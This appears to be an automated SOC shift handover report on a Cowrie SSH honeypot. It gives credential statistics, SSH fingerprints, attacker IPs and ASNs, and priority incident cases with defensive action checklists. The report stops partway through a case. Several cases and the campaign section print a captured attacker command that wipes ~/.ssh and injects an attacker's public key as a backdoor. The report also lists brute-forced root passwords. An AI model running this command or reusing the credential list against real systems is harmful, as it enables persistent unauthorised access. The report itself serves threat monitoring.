# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-10 |
| **Generated At** | 2026-05-10T20:54:22Z |
| **Shift Time** | 20:54 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **162** |
| Confirmed Threats | **80** |
| False Positives Filtered | **82** (50.6%) |
| Unique Attacker IPs | **29** |
| Countries of Origin | **19** |
| High Severity Cases | **19** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **143** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **103** |
| Unique Credential Pairs | **85** |
| Unique Usernames | **58** |
| Unique Passwords | **76** |
| Successful Auth Pairs | **15** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 19 |
| `ubuntu` | 9 |
| `345gs5662d34` | 8 |
| `admin` | 4 |
| `user` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 8 |
| `3245gs5662d34` | 8 |
| `123456` | 6 |
| `test` | 3 |
| `123456789` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 8 |
| `root` | `3245gs5662d34` | 8 |
| `root` | `admin@1` | 2 |
| `ali` | `ali!@#` | 2 |
| `guest` | `abc123` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `test2020` | `187.51.208.158` | 2026-05-10T19:16:51 |
| `root` | `3245gs5662d34` | `187.51.208.158` | 2026-05-10T19:16:58 |
| `root` | `webadmin` | `187.51.208.158` | 2026-05-10T19:19:47 |
| `root` | `test@2021` | `201.249.205.94` | 2026-05-10T19:24:29 |
| `root` | `3245gs5662d34` | `201.249.205.94` | 2026-05-10T19:24:36 |
| `root` | `adminuser` | `201.249.205.94` | 2026-05-10T19:40:48 |
| `root` | `P` | `101.36.104.242` | 2026-05-10T20:10:05 |
| `root` | `admin@1` | `144.79.187.21` | 2026-05-10T20:14:19 |
| `root` | `3245gs5662d34` | `144.79.187.21` | 2026-05-10T20:14:21 |
| `root` | `admin@1234#` | `47.83.247.106` | 2026-05-10T20:29:18 |
| `root` | `3245gs5662d34` | `47.83.247.106` | 2026-05-10T20:29:21 |
| `root` | `admin@1` | `47.83.247.106` | 2026-05-10T20:32:03 |
| `root` | `qwe123!@` | `43.99.62.208` | 2026-05-10T20:37:10 |
| `root` | `test@123` | `43.99.62.208` | 2026-05-10T20:37:37 |
| `root` | `digitalocean123` | `47.83.247.106` | 2026-05-10T20:38:58 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **162** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 89 |
| Go SSH scanner | 19 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 47 | 7 |
| `03a80b21afa8...` | Modern SSH client | 39 | 4 |
| `0a07365cc01f...` | Generic scanner | 18 | 1 |
| `19532158b559...` | Mirai/variant | 3 | 1 |
| `e54ef3ec27fe...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 47 | 7 | libssh-based |
| `03a80b21afa8...` | libssh | 39 | 4 | Modern SSH client |
| `0a07365cc01f...` | Go SSH scanner | 18 | 1 | Generic scanner |
| `19532158b559...` | libssh | 3 | 1 | Mirai/variant |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 8 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `187.51.208.158`, `201.249.205.94`, `47.83.247.106`, `144.79.187.21`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **29** |
| Unique ASNs | **26** |
| High-Risk ASNs | **16** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 2 | MEDIUM |
| `AS3215` | Orange S.A. | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS138000` | PT Antar Fiber Optik | 1 | HIGH |
| `AS4134` | CHINANET BACKBONE | 1 | MEDIUM |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 1 | HIGH |
| `AS23724` | IDC, China Telecommunications Corporation | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (19)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-5fb4e6e41f6e

| Field | Detail |
|---|---|
| **Source IP** | `187.51.208[.]158` |
| **First Seen** | 2026-05-10 19:16 |
| **Last Seen** | 2026-05-10 19:16 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 19:16:49` | `cowrie.session.connect` |
| `2026-05-10 19:16:49` | `cowrie.client.version` |
| `2026-05-10 19:16:49` | `cowrie.client.kex` |
| `2026-05-10 19:16:51` | `cowrie.login.success` |
| `2026-05-10 19:16:51` | `cowrie.session.params` |
| `2026-05-10 19:16:51` | `cowrie.command.input` |
| `2026-05-10 19:16:51` | `cowrie.command.failed` |
| `2026-05-10 19:16:52` | `cowrie.log.closed` |
| `2026-05-10 19:16:52` | `cowrie.session.params` |
| `2026-05-10 19:16:52` | `cowrie.command.input` |
| `2026-05-10 19:16:53` | `cowrie.session.file_download` |
| `2026-05-10 19:16:53` | `cowrie.log.closed` |
| `2026-05-10 19:16:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.51.208[.]158` to AbuseIPDB if not already reported
- [ ] Block `187.51.208[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-645dcb811305

| Field | Detail |
|---|---|
| **Source IP** | `187.51.208[.]158` |
| **First Seen** | 2026-05-10 19:16 |
| **Last Seen** | 2026-05-10 19:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 19:16:56` | `cowrie.session.connect` |
| `2026-05-10 19:16:56` | `cowrie.client.version` |
| `2026-05-10 19:16:57` | `cowrie.client.kex` |
| `2026-05-10 19:16:58` | `cowrie.login.success` |
| `2026-05-10 19:16:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.51.208[.]158` to AbuseIPDB if not already reported
- [ ] Block `187.51.208[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0a16911e1f5

| Field | Detail |
|---|---|
| **Source IP** | `187.51.208[.]158` |
| **First Seen** | 2026-05-10 19:19 |
| **Last Seen** | 2026-05-10 19:19 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 19:19:46` | `cowrie.session.connect` |
| `2026-05-10 19:19:46` | `cowrie.client.version` |
| `2026-05-10 19:19:46` | `cowrie.client.kex` |
| `2026-05-10 19:19:47` | `cowrie.login.success` |
| `2026-05-10 19:19:48` | `cowrie.session.params` |
| `2026-05-10 19:19:48` | `cowrie.command.input` |
| `2026-05-10 19:19:48` | `cowrie.command.failed` |
| `2026-05-10 19:19:48` | `cowrie.log.closed` |
| `2026-05-10 19:19:49` | `cowrie.session.params` |
| `2026-05-10 19:19:49` | `cowrie.command.input` |
| `2026-05-10 19:19:49` | `cowrie.session.file_download` |
| `2026-05-10 19:19:49` | `cowrie.log.closed` |
| `2026-05-10 19:19:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.51.208[.]158` to AbuseIPDB if not already reported
- [ ] Block `187.51.208[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e832b6bab8e8

| Field | Detail |
|---|---|
| **Source IP** | `187.51.208[.]158` |
| **First Seen** | 2026-05-10 19:19 |
| **Last Seen** | 2026-05-10 19:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 19:19:53` | `cowrie.session.connect` |
| `2026-05-10 19:19:53` | `cowrie.client.version` |
| `2026-05-10 19:19:53` | `cowrie.client.kex` |
| `2026-05-10 19:19:55` | `cowrie.login.success` |
| `2026-05-10 19:19:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.51.208[.]158` to AbuseIPDB if not already reported
- [ ] Block `187.51.208[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0bed89336f9

| Field | Detail |
|---|---|
| **Source IP** | `201.249.205[.]94` |
| **First Seen** | 2026-05-10 19:24 |
| **Last Seen** | 2026-05-10 19:24 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 19:24:28` | `cowrie.session.connect` |
| `2026-05-10 19:24:28` | `cowrie.client.version` |
| `2026-05-10 19:24:28` | `cowrie.client.kex` |
| `2026-05-10 19:24:29` | `cowrie.login.success` |
| `2026-05-10 19:24:30` | `cowrie.session.params` |
| `2026-05-10 19:24:30` | `cowrie.command.input` |
| `2026-05-10 19:24:30` | `cowrie.command.failed` |
| `2026-05-10 19:24:30` | `cowrie.log.closed` |
| `2026-05-10 19:24:31` | `cowrie.session.params` |
| `2026-05-10 19:24:31` | `cowrie.command.input` |
| `2026-05-10 19:24:31` | `cowrie.session.file_download` |
| `2026-05-10 19:24:31` | `cowrie.log.closed` |
| `2026-05-10 19:24:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.249.205[.]94` to AbuseIPDB if not already reported
- [ ] Block `201.249.205[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b8b95eae97d

| Field | Detail |
|---|---|
| **Source IP** | `201.249.205[.]94` |
| **First Seen** | 2026-05-10 19:24 |
| **Last Seen** | 2026-05-10 19:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 19:24:35` | `cowrie.session.connect` |
| `2026-05-10 19:24:35` | `cowrie.client.version` |
| `2026-05-10 19:24:35` | `cowrie.client.kex` |
| `2026-05-10 19:24:36` | `cowrie.login.success` |
| `2026-05-10 19:24:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.249.205[.]94` to AbuseIPDB if not already reported
- [ ] Block `201.249.205[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41f3891fabdd

| Field | Detail |
|---|---|
| **Source IP** | `201.249.205[.]94` |
| **First Seen** | 2026-05-10 19:40 |
| **Last Seen** | 2026-05-10 19:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 19:40:47` | `cowrie.session.connect` |
| `2026-05-10 19:40:47` | `cowrie.client.version` |
| `2026-05-10 19:40:47` | `cowrie.client.kex` |
| `2026-05-10 19:40:48` | `cowrie.login.success` |
| `2026-05-10 19:40:49` | `cowrie.session.params` |
| `2026-05-10 19:40:49` | `cowrie.command.input` |
| `2026-05-10 19:40:49` | `cowrie.command.failed` |
| `2026-05-10 19:40:49` | `cowrie.log.closed` |
| `2026-05-10 19:40:50` | `cowrie.session.params` |
| `2026-05-10 19:40:50` | `cowrie.command.input` |
| `2026-05-10 19:40:50` | `cowrie.session.file_download` |
| `2026-05-10 19:40:50` | `cowrie.log.closed` |
| `2026-05-10 19:40:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.249.205[.]94` to AbuseIPDB if not already reported
- [ ] Block `201.249.205[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8078e8389725

| Field | Detail |
|---|---|
| **Source IP** | `201.249.205[.]94` |
| **First Seen** | 2026-05-10 19:40 |
| **Last Seen** | 2026-05-10 19:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 19:40:53` | `cowrie.session.connect` |
| `2026-05-10 19:40:53` | `cowrie.client.version` |
| `2026-05-10 19:40:54` | `cowrie.client.kex` |
| `2026-05-10 19:40:55` | `cowrie.login.success` |
| `2026-05-10 19:40:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.249.205[.]94` to AbuseIPDB if not already reported
- [ ] Block `201.249.205[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ed05f601892

| Field | Detail |
|---|---|
| **Source IP** | `101.36.104[.]242` |
| **First Seen** | 2026-05-10 20:10 |
| **Last Seen** | 2026-05-10 20:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 20:10:04` | `cowrie.session.connect` |
| `2026-05-10 20:10:04` | `cowrie.client.version` |
| `2026-05-10 20:10:04` | `cowrie.client.kex` |
| `2026-05-10 20:10:05` | `cowrie.login.success` |
| `2026-05-10 20:10:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.104[.]242` to AbuseIPDB if not already reported
- [ ] Block `101.36.104[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba489154286b

| Field | Detail |
|---|---|
| **Source IP** | `144.79.187[.]21` |
| **First Seen** | 2026-05-10 20:14 |
| **Last Seen** | 2026-05-10 20:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 20:14:18` | `cowrie.session.connect` |
| `2026-05-10 20:14:18` | `cowrie.client.version` |
| `2026-05-10 20:14:18` | `cowrie.client.kex` |
| `2026-05-10 20:14:19` | `cowrie.login.success` |
| `2026-05-10 20:14:19` | `cowrie.session.params` |
| `2026-05-10 20:14:19` | `cowrie.command.input` |
| `2026-05-10 20:14:19` | `cowrie.command.failed` |
| `2026-05-10 20:14:19` | `cowrie.log.closed` |
| `2026-05-10 20:14:19` | `cowrie.session.params` |
| `2026-05-10 20:14:19` | `cowrie.command.input` |
| `2026-05-10 20:14:19` | `cowrie.session.file_download` |
| `2026-05-10 20:14:19` | `cowrie.log.closed` |
| `2026-05-10 20:14:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.187[.]21` to AbuseIPDB if not already reported
- [ ] Block `144.79.187[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42154342b132

| Field | Detail |
|---|---|
| **Source IP** | `144.79.187[.]21` |
| **First Seen** | 2026-05-10 20:14 |
| **Last Seen** | 2026-05-10 20:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 20:14:21` | `cowrie.session.connect` |
| `2026-05-10 20:14:21` | `cowrie.client.version` |
| `2026-05-10 20:14:21` | `cowrie.client.kex` |
| `2026-05-10 20:14:21` | `cowrie.login.success` |
| `2026-05-10 20:14:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.187[.]21` to AbuseIPDB if not already reported
- [ ] Block `144.79.187[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-188a1c2120c6

| Field | Detail |
|---|---|
| **Source IP** | `47.83.247[.]106` |
| **First Seen** | 2026-05-10 20:29 |
| **Last Seen** | 2026-05-10 20:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 20:29:18` | `cowrie.session.connect` |
| `2026-05-10 20:29:18` | `cowrie.client.version` |
| `2026-05-10 20:29:18` | `cowrie.client.kex` |
| `2026-05-10 20:29:18` | `cowrie.login.success` |
| `2026-05-10 20:29:18` | `cowrie.session.params` |
| `2026-05-10 20:29:18` | `cowrie.command.input` |
| `2026-05-10 20:29:18` | `cowrie.command.failed` |
| `2026-05-10 20:29:18` | `cowrie.log.closed` |
| `2026-05-10 20:29:19` | `cowrie.session.params` |
| `2026-05-10 20:29:19` | `cowrie.command.input` |
| `2026-05-10 20:29:19` | `cowrie.session.file_download` |
| `2026-05-10 20:29:19` | `cowrie.log.closed` |
| `2026-05-10 20:29:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.83.247[.]106` to AbuseIPDB if not already reported
- [ ] Block `47.83.247[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f5cc6954602

| Field | Detail |
|---|---|
| **Source IP** | `47.83.247[.]106` |
| **First Seen** | 2026-05-10 20:29 |
| **Last Seen** | 2026-05-10 20:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 20:29:21` | `cowrie.session.connect` |
| `2026-05-10 20:29:21` | `cowrie.client.version` |
| `2026-05-10 20:29:21` | `cowrie.client.kex` |
| `2026-05-10 20:29:21` | `cowrie.login.success` |
| `2026-05-10 20:29:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.83.247[.]106` to AbuseIPDB if not already reported
- [ ] Block `47.83.247[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c161ae1fbc55

| Field | Detail |
|---|---|
| **Source IP** | `47.83.247[.]106` |
| **First Seen** | 2026-05-10 20:32 |
| **Last Seen** | 2026-05-10 20:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
